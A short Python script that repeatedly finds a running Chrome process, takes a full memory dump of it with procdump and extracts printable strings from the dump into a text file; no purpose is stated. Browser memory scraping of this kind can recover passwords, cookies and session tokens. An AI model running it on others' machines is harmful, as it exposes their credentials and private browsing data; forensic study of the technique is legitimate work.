import psutil as psutil
import subprocess
import time


browsingprocess = ""
browserppid = ""
prcdump = ""
filein  = "proc_dump.dmp"
fileout = "strfile.txt"


def generatestring():
    print("--------- Generating Stringfile -------")
    gsf = "START /B strings.exe -n 6 -nobanner " + filein + " > " + fileout + " & exit"
    output = subprocess.check_output(gsf, shell=True)
    print("Generated Successfully")


def if_process_is_running_by_exename(exename):
    for proc in psutil.process_iter(['ppid', 'name']):
        # This will check if there exists any process running with executable name
        try:   
            if proc.info['name'] == exename:
                b = proc.info['ppid']
                return b
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            print("sss")
    return 0





while (1):
    browserppid = if_process_is_running_by_exename("chrome.exe")
    if browserppid != 0:
        print("--- Initialize Dumping of {0}".format(browserppid))
        prcdump = "START /B procdump.exe -t -ma -o " + str(browserppid) + " proc_dump.dmp & exit"
        output = subprocess.check_output(prcdump, shell=True)
        print(output)
        print("Dump Complete")
        generatestring()
    else:
        print("NO browser is running")
